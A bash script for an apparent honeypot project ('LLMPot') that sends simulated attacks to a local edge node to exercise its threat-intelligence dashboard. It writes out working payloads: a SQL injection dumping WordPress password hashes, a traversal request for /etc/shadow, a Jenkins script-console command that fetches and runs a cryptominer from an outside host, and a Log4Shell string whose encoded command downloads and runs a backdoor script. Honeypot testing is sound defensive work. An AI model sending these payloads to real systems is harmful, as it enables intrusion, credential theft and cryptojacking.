#!/bin/bash

# LLMPot Attack Simulation Script
# ---------------------------------------------
# This script sends simulated attacks to the local honeypot edge nodes

echo "============================================="
echo "   LLMPot Threat Intel - Attack Simulator"
echo "============================================="

# Ensure edge-node is running on these ports
HOST="localhost"

echo "[*] Simulating Basic SQL Injection (Russia IP)"
curl -s -X POST "http://$HOST/wp-login.php" \
     -H "User-Agent: sqlmap/1.5.2" \
     -H "X-Forwarded-For: 95.173.136.70" \
     -d "log=admin'%20UNION%20ALL%20SELECT%20NULL%2CCONCAT(0x7171787671%2CIFNULL(CAST(user_pass%20AS%20NCHAR)%2C0x20)%2C0x716b717871)%2CNULL%20FROM%20wp_users--%20-" > /dev/null
echo "  -> Sent SQLi Payload"
sleep 1

echo "[*] Simulating Directory Traversal (China IP)"
curl -s -X GET "http://$HOST/../../../../etc/shadow" \
     -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 scanner/1.0" \
     -H "X-Forwarded-For: 123.125.71.29" \
     > /dev/null
echo "  -> Sent Dir Traversal Payload"
sleep 1

echo "[*] Simulating Obfuscated Jenkins RCE (Brazil IP)"
curl -s -X POST "http://$HOST:8081/script" \
     -H "Authorization: Basic YWRtaW46" \
     -H "X-Forwarded-For: 177.105.252.193" \
     -d "script=def url = new URL('http://198.51.100.23/xmrig'); def file = new File('/tmp/update'); file.withOutputStream { it << url.openStream() }; 'chmod +x /tmp/update'.execute(); '/tmp/update -o xmr-eu1.nanopool.org:14444'.execute();" > /dev/null
echo "  -> Sent Cryptominer RCE Payload"
sleep 1

echo "[*] Simulating Zero-Day Vulnerability Probe (Germany IP)"
curl -s -X POST "http://$HOST:9200/_cat/indices" \
     -H "User-Agent: Java/1.8.0_111" \
     -H "X-Forwarded-For: 85.214.132.117" \
     -H "Content-Type: application/json" \
     -d '{"exploit": "${jndi:ldap://192.0.2.14:1389/Basic/Command/Base64/d2dldCBodHRwOi8vMTkyLjAuMi4xNS9iYWNrZG9vci5zaCAtdyAvdG1wL21haW47IGNobW9kICt4IC90bXAvbWFpbjsgL3RtcC9tYWlu}"}' > /dev/null
echo "  -> Sent Log4Shell Probe"
sleep 1

echo "============================================="
echo "[+] Attack simulations dispatched to localhost"
echo "    Check the LLMPot Dashboard for real-time analysis!"
